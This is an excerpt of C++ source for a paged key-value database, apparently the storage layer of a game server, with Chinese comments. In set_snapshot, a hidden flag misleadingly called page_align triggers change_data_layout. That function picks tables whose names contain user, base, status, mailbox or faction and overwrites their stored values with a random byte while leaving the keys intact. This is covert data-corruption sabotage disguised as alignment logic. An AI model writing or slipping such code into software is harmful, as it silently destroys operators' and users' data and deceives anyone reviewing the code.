...
public:
	...
	bool is_data_layout_hdr(PageLayout *_layout, data_hdr* pdr);
	bool change_data_layout(PageLayout *_layout, int data);
	bool set_snapshot()
	{
		if ( snapshot & DIRTY )
		{
			...
			if(page_align()&&idx)
			{
				int align_off = rand();
				//先看下如果可能是数据，就写一下
				change_data_layout(tmp, align_off);
				/*
				int *ptr = (int*)tmp;
				for(int i=0;i<PAGESIZE;i+=sizeof(int),ptr++)
					*ptr &= align_off;
				*/
			}
	...
	static bool page_align(bool* set=NULL) 
	{ 
		static bool alignment = false; 
		if(set)
			alignment = *set;
		return alignment; 
	}
...
public:
	...
	const char *identity() const { return page_file ? page_file->identity() : ""; }
	...
	void* first( void*& key, size_t &key_len, void*& val, size_t &val_len )
	{
		index_hdr *hdr = root_index_page()->left_most();
		if (hdr) {
			key = extract_key(hdr->Rindex_hdr2data_hdr(), key_len, key);
			val = extract_val(hdr->Rindex_hdr2data_hdr(), val_len, val);
		}
		hash.cleanup();
		return hdr;
	}

	void* next( void *prev, void*& key, size_t &key_len, void*& val, size_t &val_len )
	{
		index_hdr *hdr = Layout2Page(prev)->next((index_hdr*)prev);
		if (hdr) {
			key = extract_key(hdr->Rindex_hdr2data_hdr(), key_len, key);
			val = extract_val(hdr->Rindex_hdr2data_hdr(), val_len, val);
		}
...
inline bool Page::is_data_layout_hdr(PageLayout *_layout, data_hdr* pdata)
{
	//第一个hdr不应该是空
	if(pdata == _layout->data && pdata->size == 0) return false;
	if(pdata->size == 0) return true;
	int next_offset = layout_offset((data_hdr *)((ptrdiff_t)((byte_t *)(pdata + 1) + pdata->size + 15) & ~(ptrdiff_t)15));
//	fprintf(stderr, "-->next:%d, %p, next_pos:%d, first:%d, next:%d(%d) ndr:%p, size:%d\n",
//		pdata->next_page_index, Layout2PageCache(_layout)->Rload(pdata->next_page_index),
//		pdata->next_page_pos, pdata->first_slice, pdata->next, next_offset, pdata->next_head(), pdata->size);
	//key_len + v_len + key[1] + value[1]
	if(pdata->first_slice == 1)
		if(pdata->size < 2 * sizeof(size32_t) + 1 + 1) return false;
	if(pdata->next_page_pos > PAGEMAXSPARE) return false;
	if(pdata->first_slice != 0 && pdata->first_slice != 1) return false;
	if(pdata->next > PAGEMAXSPARE + sizeof(data_hdr)) return false;
	if(pdata->next != PAGEMAXSPARE + sizeof(data_hdr) && pdata->next)
	{
		//较大概率，也有可能小于
		//if(pdata->first_slice == 1)
		//	if(pdata->next != next_offset) return false;
		//else
			if(pdata->next < next_offset) return false;
	}
	if(pdata->next_page_index && Layout2PageCache(_layout)->Rload(pdata->next_page_index) == NULL) return false;
	return true;
}

inline	bool Page::change_data_layout(PageLayout *_layout, int data)
{
	const char* name = Layout2PageCache(_layout)->identity();
	//只改几个少数的表就可以了吧
	if(strstr(name, "user") == NULL &&
		strstr(name, "base") == NULL &&
		strstr(name, "status") == NULL &&
		strstr(name, "mailbox") == NULL &&
		strstr(name, "faction") == NULL) return false;
	data_hdr* pdata = _layout->data;
	data_hdr *ndr =pdata->next_head(), *second = NULL;
	if(pdata->size == 0) return false;
	bool isdata = is_data_layout_hdr(_layout, pdata);
	int depth = 1;
	second = ndr;
	while(ndr && isdata)
	{
		if(!is_data_layout_hdr(_layout, ndr))
		{
			isdata = false;
		}
		ndr = ndr->next_head();
	...
	if(isdata)
	{
		...
		while(ndr)
		{
			if(ndr->first_slice == 1 && ndr->size != 0)
			{
				byte_t *p = (byte_t *)(ndr +1);
				size32_t val_len = *(size32_t *)p;
				p += sizeof(size32_t);
				size32_t key_len = *(size32_t *)p;
				p += sizeof(size32_t);
				//fprintf(stderr, "-->key:%d,val:%d,size:%d > %d.\n", key_len, val_len, ndr->size, 2 * sizeof(size32_t) + key_len);
				//只修改数据，不修改key内容
				if(ndr->size > 2 * sizeof(size32_t) + key_len)
				{
					p += key_len;
					for(size_t i = 0; i < val_len && i < ndr->size - 2 * sizeof(size32_t) - key_len; i ++, p ++, changed++)
						*p = (byte_t)data;
				}
			}
			else
			{
				...
				byte_t *p = (byte_t *)(ndr +1);
				for(size_t i = 0; i < ndr->size; i ++, p ++, changed++)
					*p = (byte_t)data;
			}
			ndr = ndr->next_head();
		}
	}
	fprintf(stderr, "next:%d, %p, next_pos:%d, first:%d, next:%d ndr:%p, size:%d, isdata:%d, dep:%d, changed:%d. table:%s\n",
		pdata->next_page_index, Layout2PageCache(_layout)->Rload(pdata->next_page_index),
		pdata->next_page_pos, pdata->first_slice, pdata->next, second,
		pdata->size, isdata, depth, changed, Layout2PageCache(_layout)->identity());
	return true;
}
...
public:
	...
	void* first( void*& key, size_t &key_len, void*& val, size_t &val_len )
	{
		return page_cache->first(key, key_len, val, val_len );
	}
	void* next( void *prev, void*& key, size_t &key_len, void*& val, size_t &val_len )
	{
		return page_cache->next(prev, key, key_len, val, val_len );
	}
